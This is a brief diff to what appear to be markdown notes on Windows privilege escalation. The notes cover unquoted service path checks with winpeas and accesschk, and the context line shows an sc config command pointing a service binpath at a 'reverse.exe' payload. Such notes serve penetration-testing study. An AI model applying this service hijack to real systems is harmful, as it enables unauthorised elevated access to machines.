@@ -134,7 +134,7 @@ sc config <svc name> binpath= "\"C:\Privesc\reverse.exe\""
 1. Check winpeas under grey text ```Unquoted Path Service```
 2. Check if you have permission to start and stop the services 
 ```
-.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
+.\accesschk.exe /accepteula -ucqv <PC username> <svc name> 
 ```
 3. Check for write permission for each directory path 
 ```
